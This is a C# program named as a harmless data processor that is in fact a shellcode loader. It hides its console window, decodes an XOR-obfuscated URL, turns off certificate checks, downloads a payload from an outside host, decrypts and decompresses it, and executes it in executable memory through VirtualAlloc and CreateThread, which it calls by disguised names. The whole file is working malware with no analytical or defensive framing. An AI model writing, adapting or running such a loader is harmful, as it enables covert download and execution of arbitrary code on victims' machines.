using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace DataProcessor
{
    class CoreLogic
    {
        private static string GetResourcePath() => XorDecode("wxxbf://jjj-xb`klklkd`b-lod/axcb`eumycfc", 42);
        private static string GetSecurityKey() => XorDecode("jybk`gyclywxybcn", 42);
        private static string GetInitVector() => XorDecode("vyp`ye`vnaujj`bk", 42);

        private static List<string> fileTypes = new List<string>
        {
            ".html", ".css", ".js", ".json", ".xml", ".php", ".asp", ".aspx",
            ".jsp", ".cgi", ".pl", ".rss", ".svg", ".xhtml", ".cfm",
            ".axd", ".asx", ".asmx", ".ashx", ".swf"
        };

        // Función para decodificar XOR
        private static string XorDecode(string input, int key)
        {
            char[] buffer = input.ToCharArray();
            for (int i = 0; i < buffer.Length; i++)
            {
                buffer[i] = (char)(buffer[i] ^ key);
            }
            return new string(buffer);
        }

        // APIs para ocultar la ventana de consola
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        // Obfuscated memory and thread management
        private static class ResourceManager
        {
            [DllImport("kernel32.dll", EntryPoint = "VirtualAlloc", SetLastError = true, ExactSpelling = true)]
            private static extern IntPtr AllocateMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", EntryPoint = "CreateThread", SetLastError = true)]
            private static extern IntPtr StartRoutine(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll", EntryPoint = "WaitForSingleObject", SetLastError = true)]
            private static extern uint WaitForCompletion(IntPtr hHandle, uint dwMilliseconds);

            public static void ProcessData(byte[] data)
            {
                if (data.Length <= 16) return;

                byte[] payload = data.Skip(16).ToArray();
                byte[] processed = SecureTransform(payload);
                byte[] expanded = ExpandData(processed);

                IntPtr mem = AllocateMemory(IntPtr.Zero, (uint)expanded.Length, 0x3000, 0x40);
                if (mem == IntPtr.Zero) return;

                Marshal.Copy(expanded, 0, mem, expanded.Length);
                IntPtr threadHandle = StartRoutine(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForCompletion(threadHandle, 0xFFFFFFFF);
            }
        }

        private static byte[] SecureTransform(byte[] input)
        {
            byte[] key = Encoding.UTF8.GetBytes(GetSecurityKey());
            byte[] iv = Encoding.UTF8.GetBytes(GetInitVector());

            using (Aes cipher = Aes.Create())
            {
                cipher.Key = key;
                cipher.IV = iv;
                cipher.Padding = PaddingMode.None;

                ICryptoTransform transformer = cipher.CreateDecryptor(cipher.Key, cipher.IV);
                using (MemoryStream inputStream = new MemoryStream(input))
                using (MemoryStream outputStream = new MemoryStream())
                using (CryptoStream cryptoStream = new CryptoStream(inputStream, transformer, CryptoStreamMode.Read))
                {
                    cryptoStream.CopyTo(outputStream);
                    return outputStream.ToArray();
                }
            }
        }

        private static byte[] ExpandData(byte[] input)
        {
            using (MemoryStream outputStream = new MemoryStream())
            using (MemoryStream inputStream = new MemoryStream(input))
            using (GZipStream expander = new GZipStream(inputStream, CompressionMode.Decompress, true))
            {
                expander.CopyTo(outputStream);
                return outputStream.ToArray();
            }
        }

        private static byte[] FetchResource(string url)
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, errors) => true;
                using (WebClient client = new WebClient())
                {
                    return client.DownloadData(url);
                }
            }
            catch
            {
                return null;
            }
        }

        private static string LocateResource()
        {
            foreach (var type in fileTypes)
            {
                string target = GetResourcePath() + type;
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(target);
                    req.Method = "GET";
                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                    {
                        if (resp.StatusCode == HttpStatusCode.OK)
                        {
                            return target;
                        }
                    }
                }
                catch
                {
                    continue;
                }
            }
            return null;
        }

        private static void ProcessResource(string resourceUrl)
        {
            byte[] resourceData = FetchResource(resourceUrl);
            if (resourceData != null && resourceData.Length > 0)
            {
                ResourceManager.ProcessData(resourceData);
            }
        }

        public static void Main(string[] args)
        {
            // Ocultar la ventana de consola al inicio
            IntPtr consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
            {
                ShowWindow(consoleWindow, SW_HIDE);
            }

            string validResource = LocateResource();
            if (!string.IsNullOrEmpty(validResource))
            {
                ProcessResource(validResource);
            }
        }
    }
}
